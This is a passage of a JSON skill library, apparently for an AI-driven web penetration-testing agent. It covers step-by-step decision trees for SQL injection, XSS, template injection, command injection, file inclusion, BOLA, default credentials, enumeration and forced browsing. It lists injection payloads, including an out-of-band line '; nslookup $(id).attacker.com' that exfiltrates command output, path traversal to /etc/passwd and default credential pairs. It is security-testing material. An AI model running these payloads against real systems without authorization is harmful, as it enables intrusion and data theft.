            "action": "Validate finding: reproduce with a fresh request confirming consistent behavior",
            "approach": "",
            "ifPositive": "Document parameter, payload, evidence screenshot, response diff",
            "ifNegative": "Inconsistent — mark as low-confidence, note for manual review",
            "stopWhen": "Finding confirmed reproducible with at least 2 distinct payloads"
          }
        ],
        "toolGuidance": {
          "aiShould": "Craft and send payloads directly using the HTTP proxy tool. Read error messages and response diffs to infer DB type and injection context. Reason about WAF evasion if simple payloads are blocked. Only hand off to sqlmap once a vulnerable parameter is confirmed.",
          "useToolWhen": {
            "burp_proxy": "Send individual payloads and inspect raw HTTP responses",
            "sqlmap": "Confirmed injectable parameter — full dump, schema extraction, or auth bypass",
            "browser_navigate": "Load the target form to identify all input fields before testing"
          }
        },
        "techniqueRefs": [
          "sqli-error-based",
          "sqli-boolean-blind",
          "sqli-time-blind",
          "sqli-union-based"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Verify the parameter is actually processed by a DB query, not just reflected",
          "impactAssessment": "Attempt to extract one table name or DB version as proof of exploitability"
        }
      },
      {
        "id": "xss-reflected",
        "name": "xss-reflected",
        "type": "SKILL",
        "skill": "xss-reflected",
        "ref": "atomic/injection/xss-reflected",
        "dependsOn": [
          "sqli-form"
        ],
        "category": "injection",
        "goal": "Identify reflected XSS vulnerabilities by injecting probe strings into URL parameters, form fields, and HTTP headers, then confirming unescaped reflection in the HTML response. Determine execution context and craft a working PoC payload.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Inject a unique alphanumeric canary string into each input and check if it reflects unescaped in the response",
            "approach": "Use a string like xssCANARY123 first — no angle brackets, just confirm reflection exists",
            "ifPositive": "Canary reflects — determine the HTML context (attribute, tag body, JS, URL)",
            "ifNegative": "No reflection — input may not be reflected at all; skip this parameter",
            "stopWhen": ""
          },
          {
            "action": "Inject context-appropriate XSS probe based on reflection context",
            "approach": "",
            "ifPositive": "Probe reflected without encoding — try full <script>alert(1)</script> or context variant",
            "ifNegative": "Characters encoded — test alternate encodings: hex, HTML entities, JSFuck, template literals",
            "stopWhen": ""
          },
          {
            "action": "Test HTTP headers: Referer, X-Forwarded-For, User-Agent for reflection in error pages",
            "approach": "",
            "ifPositive": "Header value reflected — craft header-based XSS payload",
            "ifNegative": "Headers not reflected in output — skip header-based vectors",
            "stopWhen": ""
          },
          {
            "action": "Confirm execution: verify payload triggers in browser or via DOM inspection",
            "approach": "",
            "ifPositive": "Record full payload, parameter name, GET/POST method, and screenshot of execution",
            "ifNegative": "Payload reflected but not executing — check CSP headers, note as partial finding",
            "stopWhen": "alert()/console.log()/document.domain confirmed executing in target origin"
          }
        ],
        "toolGuidance": {
          "aiShould": "Reason about the HTML context from reflection point before choosing a payload. Read CSP headers and adjust payload if script-src blocks inline scripts. Try DOM-based vectors if server-side reflection is absent.",
          "useToolWhen": {
            "burp_proxy": "Send payloads and inspect raw HTML response for reflection analysis",
            "browser_navigate": "Confirm execution context and test DOM-based XSS vectors",
            "browser_evaluate": "Check if payload executed in browser DOM"
          }
        },
        "techniqueRefs": [
          "xss-reflected",
          "xss-dom-based",
          "xss-context-escape"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm origin of reflected output — server-rendered vs JS-injected into DOM",
          "impactAssessment": "Demonstrate session hijack potential by reading document.cookie or document.domain"
        }
      },
      {
        "id": "xss-stored",
        "name": "xss-stored",
        "type": "SKILL",
        "skill": "xss-stored",
        "ref": "atomic/injection/xss-stored",
        "dependsOn": [
          "xss-reflected"
        ],
        "category": "injection",
        "goal": "Identify stored XSS by submitting probe payloads into fields that are persisted and later rendered to other users (comments, profiles, messages, filenames, support tickets). Confirm the payload executes when the stored content is viewed, and determine which viewers are affected.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Map every input that gets persisted and re-displayed, then submit a unique canary (e.g. stCANARY123) into each",
            "approach": "Prioritise fields shown to OTHER users or admins — comments, display name, ticket body, uploaded filenames",
            "ifPositive": "Canary appears on a view page — note where it renders and to whom",
            "ifNegative": "Canary never re-displays — field may not be stored or is shown only to the submitter; deprioritise",
            "stopWhen": ""
          },
          {
            "action": "On the render page, determine the HTML context of the stored canary and inject a context-appropriate payload",
            "approach": "",
            "ifPositive": "Payload stored unescaped — try <script>alert(document.domain)</script> or a context variant",
            "ifNegative": "Output encoded on render — test alternate encodings and mutation-XSS (mXSS) via innerHTML sinks",
            "stopWhen": ""
          },
          {
            "action": "Check second-order sinks: values echoed into admin dashboards, logs, exported reports, or email templates",
            "approach": "",
            "ifPositive": "Stored value reaches a privileged view — flag as high impact (targets admins)",
            "ifNegative": "No privileged sink found — scope impact to same-role viewers",
            "stopWhen": ""
          },
          {
            "action": "Confirm execution by loading the render page in a clean browser session",
            "approach": "",
            "ifPositive": "Record submit request, render URL, affected audience, and a screenshot of execution",
            "ifNegative": "Stored but not executing — check CSP; note as partial finding",
            "stopWhen": "alert()/document.domain fires when the stored content is viewed"
          }
        ],
        "toolGuidance": {
          "aiShould": "Trace the full path from submission to render — the injection point and the execution point are different pages. Reason about who sees the render page, since stored XSS that hits admins is far more severe than self-only. Watch for encoding that differs between the input echo and the stored render.",
          "useToolWhen": {
            "burp_proxy": "Submit the payload and inspect the persisted value in the raw render response",
            "browser_navigate": "Load the render page in a fresh session to confirm execution against another viewer",
            "browser_evaluate": "Verify the payload executed in the DOM of the render page"
          }
        },
        "techniqueRefs": [
          "xss-stored",
          "xss-context-escape",
          "xss-mutation"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the payload persists across sessions and renders to a different user than the submitter",
          "impactAssessment": "Identify the affected audience (public/other-users/admins) and demonstrate cookie or session access"
        }
      },
      {
        "id": "xss-dom",
        "name": "xss-dom",
        "type": "SKILL",
        "skill": "xss-dom",
        "ref": "atomic/injection/xss-dom",
        "dependsOn": [
          "xss-stored"
        ],
        "category": "injection",
        "goal": "Identify DOM-based XSS where untrusted data flows from a client-side source (location, document.referrer, postMessage, storage) into a dangerous sink (innerHTML, eval, document.write, setAttribute) without sanitisation. The payload never needs to reach the server — reason about the JavaScript.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Read the page's JavaScript and identify sources (location.hash/search, document.referrer, window.name, localStorage, postMessage)",
            "approach": "Grep loaded JS for source reads and follow the variable to where it is used",
            "ifPositive": "A source value flows toward a sink — trace the full data flow",
            "ifNegative": "No client-side source reaches a sink — DOM XSS unlikely; move on",
            "stopWhen": ""
          },
          {
            "action": "Identify sinks the tainted value reaches (innerHTML, outerHTML, document.write, eval, Function, setAttribute, jQuery .html())",
            "approach": "",
            "ifPositive": "Tainted source reaches a sink unsanitised — craft a source-specific payload",
            "ifNegative": "Value is sanitised/encoded before the sink — test framework-specific bypasses (e.g. Angular/Vue template injection)",
            "stopWhen": ""
          },
          {
            "action": "Inject via the source: e.g. #<img src=x onerror=alert(document.domain)> in location.hash, or a crafted postMessage",
            "approach": "",
            "ifPositive": "Sink executes the payload in the DOM — DOM XSS confirmed",
            "ifNegative": "Browser encodes the fragment — try encodings that survive the specific sink (e.g. no server round-trip means URL-decoding happens client-side)",
            "stopWhen": ""
          },
          {
            "action": "For postMessage sinks, send a message from an attacker-controlled origin and check the handler validates origin",
            "approach": "",
            "ifPositive": "Record the source, sink, exact URL/fragment or postMessage, and screenshot of execution",
            "ifNegative": "Handler validates origin/type — note the control and move on",
            "stopWhen": "Payload executes purely client-side with no server reflection"
          }
        ],
        "toolGuidance": {
          "aiShould": "This is a code-reading task first, not a fuzzing task. Read the JavaScript, build the source-to-sink data-flow map, then craft the payload. The payload lives in the fragment/hash or a postMessage, so it may never appear in server logs. Distinguish DOM XSS from reflected XSS by confirming the value is written to the DOM by client JS, not by the server response.",
          "useToolWhen": {
            "browser_navigate": "Load the page with the crafted source value (hash/query) to trigger the sink",
            "browser_evaluate": "Inspect the DOM and confirm the tainted value reached the sink; trace sources at runtime",
            "burp_proxy": "Confirm the payload is NOT in the server response (proving it is DOM-based, not reflected)"
          }
        },
        "techniqueRefs": [
          "xss-dom-based",
          "xss-postmessage",
          "xss-context-escape"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the injection executes via a client-side sink and does not appear in the server-rendered HTML",
          "impactAssessment": "Demonstrate script execution in the target origin (document.domain, cookie, or session access)"
        }
      },
      {
        "id": "ssti-detect",
        "name": "ssti-detect",
        "type": "SKILL",
        "skill": "ssti-detect",
        "ref": "atomic/injection/ssti-detect",
        "dependsOn": [
          "xss-dom"
        ],
        "category": "injection",
        "goal": "Identify server-side template injection by injecting template expression probes into inputs that appear in rendered output. Determine the template engine in use and confirm code execution potential via arithmetic evaluation.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Inject arithmetic probe {{7*7}} into each input that appears reflected in rendered output",
            "approach": "If the response contains 49 rather than the literal string, SSTI is confirmed",
            "ifPositive": "49 returned — Jinja2/Twig/similar confirmed; proceed to engine fingerprinting",
            "ifNegative": "Literal reflected or no reflection — try ${7*7} for Freemarker/Thymeleaf",
            "stopWhen": ""
          },
          {
            "action": "Try ${7*7} and #{7*7} for Java-based template engines",
            "approach": "",
            "ifPositive": "49 returned — Java template engine (Freemarker, Velocity, Thymeleaf) confirmed",
            "ifNegative": "Try <#assign x=7*7>${x} for Freemarker specifically",
            "stopWhen": ""
          },
          {
            "action": "Fingerprint template engine using engine-specific syntax probes",
            "approach": "",
            "ifPositive": "Engine identified — prepare engine-specific RCE payload",
            "ifNegative": "Engine unclear — document arithmetic execution as confirmed SSTI without engine ID",
            "stopWhen": ""
          },
          {
            "action": "Attempt RCE validation: use engine-specific payload to read /etc/passwd or run id command",
            "approach": "",
            "ifPositive": "Full RCE confirmed — document payload chain and stop (critical finding)",
            "ifNegative": "No RCE — sandbox may be active; document as SSTI with limited impact",
            "stopWhen": "Command output returned in response confirms RCE via SSTI"
          }
        ],
        "toolGuidance": {
          "aiShould": "Reason carefully about which template engine is likely based on the application technology stack identified during recon. Start with the polyglot probe ${{<%['\"}}%> to trigger errors that reveal the engine. Do not attempt RCE without first confirming arithmetic evaluation.",
          "useToolWhen": {
            "burp_proxy": "Send template probes and inspect response body for evaluation results",
            "browser_navigate": "Identify technology stack and template rendering context"
          }
        },
        "techniqueRefs": [
          "ssti-jinja2",
          "ssti-freemarker",
          "ssti-twig",
          "ssti-rce-chain"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Verify arithmetic result is from server evaluation, not client-side JavaScript",
          "impactAssessment": "Attempt to read server environment variables or execute a harmless OS command"
        }
      },
      {
        "id": "cmdi-detect",
        "name": "cmdi-detect",
        "type": "SKILL",
        "skill": "cmdi-detect",
        "ref": "atomic/injection/cmdi-detect",
        "dependsOn": [
          "ssti-detect"
        ],
        "category": "injection",
        "goal": "Identify command injection vulnerabilities in parameters that may be passed to shell commands on the server. Use both in-band and out-of-band detection techniques to confirm execution without relying solely on visible response changes.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Inject command separator payloads into inputs that suggest shell interaction (ping, lookup, convert, export)",
            "approach": "Try ; id, | id, && id, `id` — look for uid= in response",
            "ifPositive": "Command output visible in response — in-band CMDi confirmed",
            "ifNegative": "No output — application may be blind; try time-based detection",
            "stopWhen": ""
          },
          {
            "action": "Test time-based blind detection: ; sleep 5, | timeout /t 5 (Windows), & ping -c 5 127.0.0.1",
            "approach": "",
            "ifPositive": "Response delayed by ~5 seconds — blind CMDi confirmed",
            "ifNegative": "No delay — try OOB via DNS: ; nslookup $(id).attacker.com",
            "stopWhen": ""
          },
          {
            "action": "Test OOB command injection via DNS lookup with command output in subdomain",
            "approach": "",
            "ifPositive": "DNS query received at collaborator — OOB CMDi confirmed with data exfil",
            "ifNegative": "No DNS query — input likely sanitized; document as low confidence",
            "stopWhen": ""
          },
          {
            "action": "Confirm on both Linux and Windows paths where OS is unknown",
            "approach": "",
            "ifPositive": "Document exact payload, parameter, OS context, and execution evidence",
            "ifNegative": "No vector confirmed — mark as tested, no finding",
            "stopWhen": "At least one command execution vector confirmed via output, timing, or OOB"
          }
        ],
        "toolGuidance": {
          "aiShould": "Identify inputs that hint at server-side OS interaction before testing. Consider both Unix and Windows payloads. Use a Burp Collaborator or interactsh OOB listener for blind detection. Do not run destructive commands — limit to id, whoami, hostname.",
          "useToolWhen": {
            "burp_proxy": "Send injection payloads and inspect response for command output or timing",
            "browser_navigate": "Identify features that suggest file operations, DNS lookups, or process execution"
          }
        },
        "techniqueRefs": [
          "cmdi-inband",
          "cmdi-blind-time",
          "cmdi-oob-dns"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Ensure timing delay is consistent and not caused by network jitter",
          "impactAssessment": "Retrieve hostname or OS version as proof of non-destructive command execution"
        }
      },
      {
        "id": "lfi-detect",
        "name": "lfi-detect",
        "type": "SKILL",
        "skill": "lfi-detect",
        "ref": "atomic/injection/lfi-detect",
        "dependsOn": [
          "cmdi-detect"
        ],
        "category": "injection",
        "goal": "Identify local file inclusion vulnerabilities in parameters that reference files or paths on the server. Attempt to read known system files to confirm exploitability, and probe for path traversal sequences that bypass filters.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Identify parameters that look like file references: ?page=, ?file=, ?template=, ?include=",
            "approach": "Any parameter that loads dynamic content by filename is a candidate",
            "ifPositive": "Parameter found — inject traversal sequences targeting /etc/passwd or /etc/hosts",
            "ifNegative": "No file-like parameters visible — check hidden parameters via parameter discovery",
            "stopWhen": ""
          },
          {
            "action": "Inject basic traversal: ../../../etc/passwd and observe response",
            "approach": "",
            "ifPositive": "File content returned — LFI confirmed; note depth and check for RFI",
            "ifNegative": "Error or blank — try encoded variants: ..%2F..%2F, ....//....//,  %252e%252e%252f",
            "stopWhen": ""
          },
          {
            "action": "Try null byte termination and extension bypass: ../../../etc/passwd%00, ../../../etc/passwd%00.jpg",
            "approach": "",
            "ifPositive": "File content returned — LFI confirmed with null byte bypass",
            "ifNegative": "Still blocked — try absolute paths: /etc/passwd, C:\\Windows\\win.ini",
            "stopWhen": ""
          },
          {
            "action": "Test Windows-specific paths if .asp/.aspx/.php+IIS detected: C:\\Windows\\system32\\drivers\\etc\\hosts",
            "approach": "",
            "ifPositive": "Windows hosts file returned — LFI on Windows confirmed",
            "ifNegative": "No LFI confirmed — document as tested, move on",
            "stopWhen": ""
          },
          {
            "action": "If LFI confirmed, attempt to read application source or config files",
            "approach": "",
            "ifPositive": "Document file contents (redacted), path traversal depth, and bypass technique used",
            "ifNegative": "Limited to /etc/passwd — document as confirmed LFI with low sensitivity impact",
            "stopWhen": "Sensitive file content retrieved (credentials, source code, or system file)"
          }
        ],
        "toolGuidance": {
          "aiShould": "Enumerate likely file paths based on the tech stack identified during recon. Try both Unix and Windows paths when OS is unknown. Read response length and content changes to detect blind LFI even without direct output.",
          "useToolWhen": {
            "burp_proxy": "Send traversal payloads and inspect response body for file contents",
            "browser_navigate": "Identify dynamic content-loading parameters in the application"
          }
        },
        "techniqueRefs": [
          "lfi-path-traversal",
          "lfi-null-byte",
          "lfi-wrapper-php",
          "lfi-to-rce-log-poisoning"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Verify that returned content is actually from a server file, not a cached or static resource",
          "impactAssessment": "Attempt to read a configuration file containing credentials or an API key"
        }
      }
    ]
  },
  {
    "id": "bola-check",
    "name": "Bola Check",
    "description": "Test API endpoints for Broken Object Level Authorization (API1:2023 / BOLA)",
    "level": "atomic",
    "category": "api",
    "ref": "atomic/api/bola-check",
    "steps": [
      {
        "id": "bola-check",
        "name": "bola-check",
        "type": "SKILL",
        "skill": "bola-check",
        "ref": "atomic/api/bola-check",
        "dependsOn": [],
        "category": "api",
        "goal": "Identify BOLA (API-layer IDOR) where an API returns or modifies objects the caller should not access, based on an object identifier in the path, query, body, or header. Test horizontal (peer) and vertical (privilege) boundaries across every object-referencing endpoint.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Enumerate object-referencing API endpoints and their ID parameters (/api/v1/orders/{id}, ?account=, body userId, X-Account-Id header)",
            "approach": "Capture the API traffic of a normal session; list every request that carries an object identifier",
            "ifPositive": "Object IDs found — provision two API tokens (Account A and Account B) for cross-account tests",
            "ifNegative": "IDs are opaque (UUID/hash) — check responses for leaked IDs and test predictability/enumeration",
            "stopWhen": ""
          },
          {
            "action": "Using Account B's token, request Account A's object IDs on each endpoint (GET first)",
            "approach": "",
            "ifPositive": "Account A's object returned to Account B — read BOLA confirmed",
            "ifNegative": "403/404 returned — proceed to write methods, which are often less guarded than reads",
            "stopWhen": ""
          },
          {
            "action": "Repeat with state-changing methods (PUT/PATCH/POST/DELETE) against Account A's IDs using Account B's token",
            "approach": "",
            "ifPositive": "Cross-account modify/delete succeeds — write BOLA confirmed (higher severity)",
            "ifNegative": "Writes rejected — test method override (X-HTTP-Method-Override) and alternate content types",
            "stopWhen": ""
          },
          {
            "action": "Test vertical BOLA: use a low-privilege token against admin/internal object IDs and endpoints",
            "approach": "",
            "ifPositive": "Privileged object reachable by low-privilege token — privilege escalation confirmed",
            "ifNegative": "Object authorization enforced server-side — document tested endpoints and IDs",
            "stopWhen": "Every object-referencing endpoint tested across horizontal and vertical boundaries"
          }
        ],
        "toolGuidance": {
          "aiShould": "Reason about the object-ownership model of the API before testing. The server, not the client, must enforce that the token owns the object — a 200 with someone else's data is the finding. Prefer sequential/guessable IDs and IDs leaked in list endpoints. Keep the two tokens' requests otherwise identical so only the authorization boundary is under test.",
          "useToolWhen": {
            "burp_proxy": "Replay each request swapping only the auth token/object ID, and diff the responses",
            "curl": "Script systematic ID substitution across the endpoint list"
          }
        },
        "techniqueRefs": [
          "idor-horizontal",
          "idor-vertical",
          "bola-id-enumeration"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm the returned object belongs to a different tenant/user, not a shared or public resource",
          "impactAssessment": "Quantify exposed data (PII, financial, other tenants) and whether write access is possible"
        }
      }
    ]
  },
  {
    "id": "cmdi-detect",
    "name": "Cmdi Detect",
    "description": "Detect OS command injection in inputs passed to shell commands",
    "level": "atomic",
    "category": "injection",
    "ref": "atomic/injection/cmdi-detect",
    "steps": [
      {
        "id": "cmdi-detect",
        "name": "cmdi-detect",
        "type": "SKILL",
        "skill": "cmdi-detect",
        "ref": "atomic/injection/cmdi-detect",
        "dependsOn": [],
        "category": "injection",
        "goal": "Identify command injection vulnerabilities in parameters that may be passed to shell commands on the server. Use both in-band and out-of-band detection techniques to confirm execution without relying solely on visible response changes.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Inject command separator payloads into inputs that suggest shell interaction (ping, lookup, convert, export)",
            "approach": "Try ; id, | id, && id, `id` — look for uid= in response",
            "ifPositive": "Command output visible in response — in-band CMDi confirmed",
            "ifNegative": "No output — application may be blind; try time-based detection",
            "stopWhen": ""
          },
          {
            "action": "Test time-based blind detection: ; sleep 5, | timeout /t 5 (Windows), & ping -c 5 127.0.0.1",
            "approach": "",
            "ifPositive": "Response delayed by ~5 seconds — blind CMDi confirmed",
            "ifNegative": "No delay — try OOB via DNS: ; nslookup $(id).attacker.com",
            "stopWhen": ""
          },
          {
            "action": "Test OOB command injection via DNS lookup with command output in subdomain",
            "approach": "",
            "ifPositive": "DNS query received at collaborator — OOB CMDi confirmed with data exfil",
            "ifNegative": "No DNS query — input likely sanitized; document as low confidence",
            "stopWhen": ""
          },
          {
            "action": "Confirm on both Linux and Windows paths where OS is unknown",
            "approach": "",
            "ifPositive": "Document exact payload, parameter, OS context, and execution evidence",
            "ifNegative": "No vector confirmed — mark as tested, no finding",
            "stopWhen": "At least one command execution vector confirmed via output, timing, or OOB"
          }
        ],
        "toolGuidance": {
          "aiShould": "Identify inputs that hint at server-side OS interaction before testing. Consider both Unix and Windows payloads. Use a Burp Collaborator or interactsh OOB listener for blind detection. Do not run destructive commands — limit to id, whoami, hostname.",
          "useToolWhen": {
            "burp_proxy": "Send injection payloads and inspect response for command output or timing",
            "browser_navigate": "Identify features that suggest file operations, DNS lookups, or process execution"
          }
        },
        "techniqueRefs": [
          "cmdi-inband",
          "cmdi-blind-time",
          "cmdi-oob-dns"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Ensure timing delay is consistent and not caused by network jitter",
          "impactAssessment": "Retrieve hostname or OS version as proof of non-destructive command execution"
        }
      }
    ]
  },
  {
    "id": "default-creds",
    "name": "Default Creds",
    "description": "Test for default and common credentials on login endpoints",
    "level": "atomic",
    "category": "auth",
    "ref": "atomic/auth/default-creds",
    "steps": [
      {
        "id": "default-creds",
        "name": "default-creds",
        "type": "SKILL",
        "skill": "default-creds",
        "ref": "atomic/auth/default-creds",
        "dependsOn": [],
        "category": "auth",
        "goal": "Attempt authentication with default and commonly-used credentials on all discovered login endpoints. Cover application defaults, framework defaults, and the most common weak passwords. Stop immediately on first successful authentication to avoid lockout.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Identify all login endpoints discovered during recon (including admin panels, API auth)",
            "approach": "Check /admin, /login, /wp-admin, /manager, /console, /phpmyadmin, /api/auth",
            "ifPositive": "Login endpoint found — proceed with credential testing",
            "ifNegative": "No login found — check for HTTP basic auth prompts on sensitive paths",
            "stopWhen": ""
          },
          {
            "action": "Test admin/admin, admin/password, admin/123456, root/root, guest/guest against each endpoint",
            "approach": "",
            "ifPositive": "Login successful — immediately stop, document credential pair and access level",
            "ifNegative": "All failed — try application-specific defaults (tomcat/tomcat, pi/raspberry)",
            "stopWhen": ""
          },
          {
            "action": "Test vendor-specific defaults based on identified tech stack",
            "approach": "",
            "ifPositive": "Login successful — document, stop further testing on this endpoint",
            "ifNegative": "All vendor defaults failed — check if lockout policy is active before continuing",
            "stopWhen": ""
          },
          {
            "action": "If no lockout detected, test top-10 passwords from common breach lists",
            "approach": "",
            "ifPositive": "Credential found — record username, password, endpoint, and privilege level accessed",
            "ifNegative": "No valid credentials — document as tested with no finding",
            "stopWhen": "Successful login OR lockout triggered OR all common passwords exhausted"
          }
        ],
        "toolGuidance": {
          "aiShould": "Monitor response codes and body content carefully to distinguish between failed login (401/403/error message) and success (200/302 to dashboard). Watch for account lockout indicators after 5+ failures on the same account. Do not run automated spraying — test manually with targeted credential sets.",
          "useToolWhen": {
            "browser_navigate": "Submit credentials via login form and observe redirect/response",
            "burp_proxy": "Inspect POST parameters for login form field names before testing"
          }
        },
        "techniqueRefs": [
          "auth-default-creds",
          "auth-credential-stuffing-targeted"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Confirm authenticated session by accessing a protected resource after login",
          "impactAssessment": "Determine privilege level of the logged-in account (admin vs regular user)"
        }
      }
    ]
  },
  {
    "id": "endpoint-discovery",
    "name": "Endpoint Discovery",
    "description": "Map all accessible endpoints, parameters, and API routes on the target",
    "level": "atomic",
    "category": "recon",
    "ref": "atomic/recon/endpoint-discovery",
    "steps": [
      {
        "id": "endpoint-discovery",
        "name": "endpoint-discovery",
        "type": "SKILL",
        "skill": "endpoint-discovery",
        "ref": "atomic/recon/endpoint-discovery",
        "dependsOn": [],
        "category": "recon",
        "goal": "Build a complete map of the application's attack surface by crawling the site, discovering hidden paths via wordlist brute-force, and extracting endpoints from JavaScript files and API responses. The output feeds all subsequent injection and access-control tests.",
        "intrusive": false,
        "decisionTree": [
          {
            "action": "Spider the application from the root URL, following all links and forms",
            "approach": "Use passive crawl first to avoid triggering WAF or rate limits",
            "ifPositive": "Sitemap populated — identify unique paths and parameters",
            "ifNegative": "Single-page app or no links — switch to JS analysis for routes",
            "stopWhen": ""
          },
          {
            "action": "Run directory brute-force with a web content wordlist (common.txt, raft-medium)",
            "approach": "",
            "ifPositive": "Hidden paths discovered — add to target list, check for directory listing",
            "ifNegative": "No new paths found — application uses non-standard routing; analyze JS bundles",
            "stopWhen": ""
          },
          {
            "action": "Extract API routes and parameters from JavaScript files (fetch, axios, XHR calls)",
            "approach": "",
            "ifPositive": "API endpoints found — test each for authentication requirements and input parameters",
            "ifNegative": "No API calls in JS — check for Swagger/OpenAPI at /api/docs, /swagger.json",
            "stopWhen": ""
          },
          {
            "action": "Check common API documentation paths: /api/, /api/v1/, /swagger-ui/, /graphql",
            "approach": "",
            "ifPositive": "API spec found — import all routes as test targets",
            "ifNegative": "No API docs — proceed with discovered paths only",
            "stopWhen": "Full endpoint list compiled — at minimum 10 unique paths or all discoverable paths found"
          }
        ],
        "toolGuidance": {
          "aiShould": "Synthesize the crawl results and identify the highest-value targets (auth endpoints, data-returning APIs, file upload handlers, admin paths). Prioritize parameters that accept IDs, filenames, or free-text for injection testing.",
          "useToolWhen": {
            "browser_navigate": "Crawl the application and extract all links, forms, and JS endpoints",
            "burp_proxy": "Review all intercepted requests from the crawl to identify parameters"
          }
        },
        "techniqueRefs": [
          "recon-crawl",
          "recon-dirbusting",
          "recon-js-analysis"
        ],
        "validation": {
          "mustReproduce": false,
          "contextCheck": "Verify discovered endpoints actually return meaningful responses (not all 404/403)",
          "impactAssessment": "Identify any admin or sensitive endpoints exposed without authentication"
        }
      }
    ]
  },
  {
    "id": "enumeration",
    "name": "Enumeration",
    "description": "Enumerate valid usernames and identify authentication weaknesses",
    "level": "atomic",
    "category": "auth",
    "ref": "atomic/auth/enumeration",
    "steps": [
      {
        "id": "enumeration",
        "name": "enumeration",
        "type": "SKILL",
        "skill": "enumeration",
        "ref": "atomic/auth/enumeration",
        "dependsOn": [],
        "category": "auth",
        "goal": "Identify valid usernames through response differences in login, registration, and password reset flows. Additionally detect weak authentication controls such as missing rate limiting, verbose error messages, and insecure account recovery mechanisms.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Test login form with valid username + wrong password vs invalid username + wrong password",
            "approach": "Look for response time difference, error message difference, or HTTP status difference",
            "ifPositive": "Different response reveals valid usernames — enumerate common usernames (admin, user, test, support)",
            "ifNegative": "Identical responses — test password reset flow for username enumeration",
            "stopWhen": ""
          },
          {
            "action": "Test password reset endpoint: submit known-valid and known-invalid email addresses",
            "approach": "",
            "ifPositive": "Different response or email content confirms valid account — enumerate via reset",
            "ifNegative": "Identical responses — test registration endpoint for duplicate account detection",
            "stopWhen": ""
          },
          {
            "action": "Test registration: attempt to register with commonly-used usernames and observe error messages",
            "approach": "",
            "ifPositive": "Username taken error reveals valid account — document enumerable usernames",
            "ifNegative": "No enumeration vector found in registration — check timing side-channels",
            "stopWhen": ""
          },
          {
            "action": "Measure response time difference for valid vs invalid usernames with identical passwords",
            "approach": "",
            "ifPositive": "Timing difference > 100ms consistently indicates username enumeration via timing",
            "ifNegative": "No timing difference — authentication is resistant to username enumeration",
            "stopWhen": ""
          },
          {
            "action": "Test for rate limiting: send 20 rapid login attempts and check for lockout or throttling",
            "approach": "",
            "ifPositive": "No rate limit — flag as missing brute-force protection (medium finding)",
            "ifNegative": "Rate limit active — document threshold and lockout behavior",
            "stopWhen": "Rate limit policy documented and all enumeration vectors tested"
          }
        ],
        "toolGuidance": {
          "aiShould": "Carefully compare response bodies, not just status codes, for enumeration signals. Timing attacks require multiple samples to be statistically valid. Document exact response differences as evidence in findings.",
          "useToolWhen": {
            "burp_proxy": "Compare raw responses for login/reset/registration flows",
            "browser_navigate": "Interact with auth flows to observe full UI behavior"
          }
        },
        "techniqueRefs": [
          "auth-username-enum",
          "auth-timing-attack",
          "auth-rate-limit-bypass"
        ],
        "validation": {
          "mustReproduce": true,
          "contextCheck": "Verify enumeration signal is consistent across multiple requests, not intermittent",
          "impactAssessment": "Enumerate at least 3 valid usernames to demonstrate practical exploitability"
        }
      }
    ]
  },
  {
    "id": "forced-browsing",
    "name": "Forced Browsing",
    "description": "Test for unauthorized access to protected pages and resources via direct URL access",
    "level": "atomic",
    "category": "access-control",
    "ref": "atomic/access-control/forced-browsing",
    "steps": [
      {
        "id": "forced-browsing",
        "name": "forced-browsing",
        "type": "SKILL",
        "skill": "forced-browsing",
        "ref": "atomic/access-control/forced-browsing",
        "dependsOn": [],
        "category": "access-control",
        "goal": "Identify access control failures where protected pages, admin panels, API endpoints, or sensitive files are accessible by directly navigating to their URLs without proper authentication or authorization checks.",
        "intrusive": true,
        "decisionTree": [
          {
            "action": "Collect all URLs discovered during recon that require authentication",
            "approach": "Log out and attempt to directly access each authenticated URL",
            "ifPositive": "Authenticated page loads without login — unauthenticated access confirmed",
            "ifNegative": "Redirect to login — test with a lower-privilege authenticated session instead",
            "stopWhen": ""
          },
          {
            "action": "With a low-privilege account, directly access admin or high-privilege URLs",
            "approach": "",
            "ifPositive": "Admin page loads for regular user — vertical privilege escalation via forced browsing",
            "ifNegative": "403 returned — check if error page leaks sensitive information",
            "stopWhen": ""
          },
          {
            "action": "Test predictable backup and configuration file paths: .bak, .old, .config, web.config, .env",
            "approach": "",
            "ifPositive": "Sensitive file returned — configuration or credential exposure confirmed",
            "ifNegative": "All return 404/403 — check for exposed .git, .svn, .DS_Store directories",
            "stopWhen": ""
          },
          {
            "action": "Test for exposed version control directories: /.git/config, /.svn/entries, /.git/HEAD",
            "approach": "",
            "ifPositive": "Git/SVN metadata accessible — source code exposure, reconstruct repo",
            "ifNegative": "No VCS exposure — check for exposed log files: /logs/, /debug, /error.log",
            "stopWhen": ""
          },
          {
            "action": "Test common sensitive endpoints not linked in the UI: /admin, /console, /debug, /metrics, /health",
            "approach": "",
            "ifPositive": "Unprotected sensitive endpoint found — document URL and accessible content",
            "ifNegative": "All sensitive paths protected — document as tested with no forced browsing finding",
            "stopWhen": "All discovered and common sensitive paths tested for unauthorized access"
          }
        ],
        "toolGuidance": {
          "aiShould": "Build a comprehensive list of URLs from the crawl before testing. Test each URL in three contexts: unauthenticated, low-privilege, and if possible a different user's session. Pay special attention to multi-step workflows that might skip authorization on intermediate steps.",
          "useToolWhen": {
            "browser_navigate": "Directly access URLs in different authentication contexts",
